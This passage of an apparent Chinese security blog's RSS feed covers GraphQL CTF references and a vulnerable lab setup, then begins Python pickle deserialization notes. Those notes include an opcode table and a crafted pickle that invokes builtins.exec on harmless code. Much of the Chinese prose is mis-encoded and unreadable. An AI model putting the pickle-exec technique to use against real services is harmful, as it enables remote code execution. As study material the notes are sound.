console.log(&amp;#39;user&amp;#39;, user)
return{
...user,
...ctx,
...app.context
};
},
validationRules: [ depthLimit(10) ]
});
// ...
&lt;/code>&lt;/pre>&lt;h3 id="graphene-django-debugæ¨¡å¼ä¸‹çš„å®‰å…¨é—®é¢˜">Graphene-Django DEBUGæ¨¡å¼ä¸‹çš„å®‰å…¨é—®é¢˜&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903201318096.png" alt="image-20210903201318096">&lt;/p>
&lt;h2 id="åœ¨ctfä¸­çš„è¡¨ç°">åœ¨CTFä¸­çš„è¡¨ç°&lt;/h2>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;p>[corCTF 2021]devme&lt;/p>
&lt;h2 id="ç»“å°¾">ç»“å°¾&lt;/h2>
&lt;p>&lt;a href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">Damn Vulnerable GraphQL Application&lt;/a>-&amp;gt; ä¸€ä¸ªæ¼æ´å¤ç°çš„é¶åœºï¼ŒåŒ…å«äº†ä¸Šé¢æåˆ°å’Œæ²¡æåˆ°çš„GraphQLå­˜åœ¨çš„æ´&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull dolevf/dvga
docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903203245165.png" alt="image-20210903203245165">&lt;/p>
&lt;p>å·²ç»æœ‰&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">å†™å¥½çš„wp&lt;/a>äº† ä¸å‘äº’è”ç½‘äº§å‡ºæ¹¿åƒåœ¾ ä»æˆ‘åšèµ·&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://graphql.cn/">ä¸­æ–‡å®˜ç½‘&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://graphqlapp.herokuapp.com/">åœ¨çº¿GraphiQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/zhouyuexie/learn-graphql">learn-graphql&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.zhihu.com/question/264629587">ä»€ä¹ˆæ˜¯ GraphQLï¼Ÿ&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.secpulse.com/archives/148242.html">ç©è½¬graphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903795407716366">GraphQL ä»å…¥é—¨åˆ°å®è·µ&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903841813495822">ã€CuteJavaScriptã€‘GraphQLçœŸé¦™å…¥é—¨æ•™ç¨‹&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf">æ”»å‡»GraphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">GraphQLå®‰å…¨æŒ‡åŒ—&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.shuzhiduo.com/A/RnJW3BRoJq/">UWP GraphQLæ•°æ®æŸ¥è¯¢çš„å®ç°&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">GraphQL Mutations&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">GraphQL NoSQL Injection Through JSON Types&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/">GraphQL Injection&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">ã€å®‰å…¨è®°å½•ã€‘ç©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸Šï¼‰&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/mmJrE6uIBC-4ztr5PFZasA">ã€å®‰å…¨è®°å½•ã€‘ç©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸‹ï¼‰&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;p>å¼€å­¦äº†ï¼Œä¸æ‘†çƒ‚ä»æˆ‘åšèµ·&lt;/p></description></item><item><title>ååºåˆ—åŒ–ä¸“é¢˜ç¬”è®°Â·å£¹Â·pythonç¯‡</title><link>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</link><pubDate>Thu, 12 Aug 2021 11:48:05 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</guid><description>&lt;h2 id="åºåˆ—åŒ–ååºåˆ—åŒ–">åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ–&lt;/h2>
&lt;p>åœ¨pythonä¸­æœ‰å¥½å‡ ä¸ªå†…ç½®æ¨¡å—éƒ½å¯ä»¥å¹²åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ–è¿™ä¸ªäº‹ï¼Œæ¯”å¦‚&lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label2">json&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label3">pickle&lt;/a>/&lt;a href="https://docs.python.org/2/library/pickle.html#module-cPickle">cpickle&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label4">shelve&lt;/a>, &lt;a href="https://docs.python.org/zh-cn/3/library/marshal.html">marshal&lt;/a>ï¼Œè€Œæœ¬æ–‡åé¢æ¶‰åŠåˆ°çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œè‹¥æ— ç‰¹æ®Šè¯´æ˜ï¼ŒæŒ‡çš„éƒ½æ˜¯pickleã€‚&lt;/p>
&lt;p>pickleåçš„å¯¹è±¡ä»¥äºŒè¿›åˆ¶å­—èŠ‚æµå­˜å‚¨ï¼Œèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œæ¯”å¦‚&lt;/p>
&lt;ul>
&lt;li>&lt;code>None&lt;/code> ã€ &lt;code>True&lt;/code> å’Œ &lt;code>False&lt;/code>&lt;/li>
&lt;li>æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•°&lt;/li>
&lt;li>strã€byteã€bytearray&lt;/li>
&lt;li>åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict&lt;/li>
&lt;li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰&lt;/li>
&lt;li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•°&lt;/li>
&lt;li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±»&lt;/li>
&lt;li>&lt;code>__dict__&lt;/code> å±æ€§å€¼æˆ– &lt;code>__getstate__()&lt;/code> å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰&lt;/li>
&lt;/ul>
&lt;p>å½“ç„¶ä¹Ÿæœ‰ä¾‹å¤–ï¼Œæ¯”å¦‚æ–‡ä»¶å¯¹è±¡å’Œç½‘ç»œå¥—æ¥å­—å¯¹è±¡ä»¥åŠä»£ç å¯¹è±¡å°±ä¸å¯ä»¥ã€‚&lt;/p>
&lt;p>å¯¹äºä¸€ä¸ªObjectï¼Œå¯ä»¥é€šè¿‡é‡å†™&lt;code>object.__reduce__()&lt;/code>å‡½æ•°ï¼Œä½¿å…¶è¢«åºåˆ—åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œï¼›æ­¤å‡½æ•°ä¼šè¿”å›ä¸€ä¸ª&lt;code>(callable, ([para1, para2, ...])[, ...])&lt;/code>çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®æ˜¯æ„é€ å‡½æ•°ï¼‰ã€‚&lt;/p>
&lt;p>pickleçš„å¸¸ç”¨æ–¹æ³•æœ‰dumps(), loads()å’Œdump(), load()ï¼Œä¸å¸¦sçš„éœ€è¦çš„å‚æ•°æ˜¯æ–‡ä»¶å¥æŸ„ï¼Œè€Œå¸¦sçš„æ‰€éœ€è¦çš„å‚æ•°æ˜¯å­—ç¬¦ä¸²ã€‚&lt;/p>
&lt;p>è¯´åˆ°pickleä¸å¾—ä¸è°ˆçš„æ˜¯opcodeï¼Œå³&lt;u>PVM(python virtual machine)&lt;/u>çš„æ“ä½œç ï¼Œå®ƒå¯ä»¥è¢«PVMçš„è§£æå¼•æ“è§£é‡Šå¤„ç†ã€‚ç›®å‰opcodeæœ‰å¤šä¸åŒçš„å®ç°ç‰ˆæœ¬ï¼ˆä½†å‘ä¸‹å…¼å®¹ï¼‰ï¼Œå…¶ä¸­py2å’Œpy3åºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸åŒçš„ï¼Œå¯ä»¥åœ¨è°ƒç”¨å‡½æ•°æ—¶æŒ‡å®šåè®®ç‰ˆæœ¬ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;ver_&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># python3è¾“å‡º protocol&amp;lt;=5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;(dp0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">V1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">sV2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">s.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x02&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_3&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_4&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_5&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">(&lt;/span>&lt;span style="color:#8045ff">\x8c\x01&lt;/span>&lt;span style="color:#d88200">1&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01\x8c\x01&lt;/span>&lt;span style="color:#d88200">2&lt;/span>&lt;span style="color:#8045ff">\x94&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># python2è¾“å‡º protocal&amp;lt;=2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dp0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">p1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">I1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">p2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">I2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ver_2&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">ï¿½&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">U&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">q&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>0å·ç‰ˆæœ¬åºåˆ—åŒ–çš„ç»“æœçœ‹èµ·æ¥å¯è¯»æ€§å¾ˆå¼º éƒ½æ˜¯å¯è§†çš„å­—ç¬¦ï¼Œæ“ä½œç ä¹Ÿæ¯”è¾ƒç›´æ¥åœ°æš´éœ²å‡ºæ¥ï¼Œé‡ç‚¹å…³æ³¨å‡ ä¸ªï¼š&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Opcode&lt;/th>
&lt;th>Mnemonic&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>(&lt;/td>
&lt;td>MARK&lt;/td>
&lt;td>Push a mark object onto the stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>S&lt;/td>
&lt;td>STRING&lt;/td>
&lt;td>string&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>I&lt;/td>
&lt;td>INT&lt;/td>
&lt;td>Push integer or bool; decimal string argument&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>l&lt;/td>
&lt;td>LIST&lt;/td>
&lt;td>build a list from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>d&lt;/td>
&lt;td>DICT&lt;/td>
&lt;td>build a dict from stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>}&lt;/td>
&lt;td>EMPTY_DICT&lt;/td>
&lt;td>Push empty dict&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>t&lt;/td>
&lt;td>TUPLE&lt;/td>
&lt;td>Build a tuple from topmost stack items&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>)&lt;/td>
&lt;td>EMPTY_TUPLE&lt;/td>
&lt;td>Push empty tuple&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>c&lt;/td>
&lt;td>GLOBAL&lt;/td>
&lt;td>Push self.find_class(module, args); 2 string args&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>R&lt;/td>
&lt;td>REDUCE&lt;/td>
&lt;td>Apply callable to argtuple, both on stack&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>b&lt;/td>
&lt;td>BUILD&lt;/td>
&lt;td>call &lt;code>__setstate__&lt;/code> or &lt;code>__dict__.update()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>i&lt;/td>
&lt;td>INST&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>o&lt;/td>
&lt;td>OBJ&lt;/td>
&lt;td>build &amp;amp; push class instance&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.&lt;/td>
&lt;td>STOP&lt;/td>
&lt;td>Every pickle ends with STOP&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>ä½¿ç”¨**&lt;u>pickletools&lt;/u>**å¯ä»¥å°†opcodeè½¬åŒ–ä¸ºè‚‰çœ¼å¯è¯»å–çš„å½¢å¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickletools&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">cbuiltins&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">exec&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x13\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">key1=b&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">key2=b&amp;#39;2&amp;#39;q&lt;/span>&lt;span style="color:#8045ff">\x01\x85&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">Rq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickletools&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dis&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span> \&lt;span style="color:#111">x80&lt;/span> &lt;span style="color:#111">PROTO&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
